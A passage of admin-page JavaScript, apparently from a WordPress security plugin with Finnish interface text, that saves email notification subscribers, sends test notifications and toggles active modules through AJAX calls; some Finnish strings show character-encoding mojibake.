	const noSubs = list.querySelector('.ps-no-subscribers');
	if (noSubs) noSubs.remove();

	const clone = template.content.cloneNode(true);
	list.appendChild(clone);
};

window.pmcSaveSubscribers = async (btn) => {
	const subscribers = [];
	const list = document.getElementById('ps-subscribers-list');
	const cards = list.querySelectorAll('.ps-subscriber-card');
	
	cards.forEach(card => {
		const email = card.querySelector('.sub-email').value.trim();
		if (!email) return;
		
		const events = [];
		const checkboxes = card.querySelectorAll('.sub-event:checked');
		checkboxes.forEach(cb => events.push(cb.value));
		
		subscribers.push({
			email: email,
			events: events
		});
	});

	const payload = {
		subscribers: JSON.stringify(subscribers)
	};

	btn.disabled = true;
	const oldText = btn.textContent;
	btn.textContent = 'Tallennetaan...';

	const res = await pmcSec.post('pmc_security_save_notifications', payload);
	if (res.success) {
		alert('Ilmoitusasetukset tallennettu onnistuneesti!');
	} else {
		alert('Ilmoitusasetusten tallennus epï¿½onnistui: ' + (res.data || 'Tuntematon virhe'));
	}

	btn.disabled = false;
	btn.textContent = oldText;
};

window.pmcSendTestNotifications = async (btn) => {
	btn.disabled = true;
	const oldText = btn.textContent;
	btn.textContent = 'Lï¿½hetetï¿½ï¿½n...';

	const res = await pmcSec.post('pmc_security_send_test_notifications', {});
	if (res.success) {
		alert('Testisï¿½hkï¿½postit lï¿½hetetty onnistuneesti kaikille tilaajille!');
	} else {
		alert('Testisï¿½hkï¿½postien lï¿½hetys epï¿½onnistui: ' + (res.data || 'Tuntematon virhe'));
	}

	btn.disabled = false;
	btn.textContent = oldText;
};

window.pmcSaveActiveModules = async function() {
	const checkboxes = document.querySelectorAll('.module-toggle-checkbox');
	const activeModules = {};
	checkboxes.forEach(cb => {
		activeModules[cb.getAttribute('data-module')] = cb.checked ? 1 : 0;
	});
	try {
		await pmcSec.post('pmc_security_save_active_modules', { modules: activeModules });
		// We could show a toast here, but for toggles it's better to just save silently
	} catch (e) {
		console.error("Aktiivisten moduulien tallennus epÃ¤onnistui", e);
	}
};

// Init on load
pmcSec.init();

}); // end DOMContentLoaded
</script>




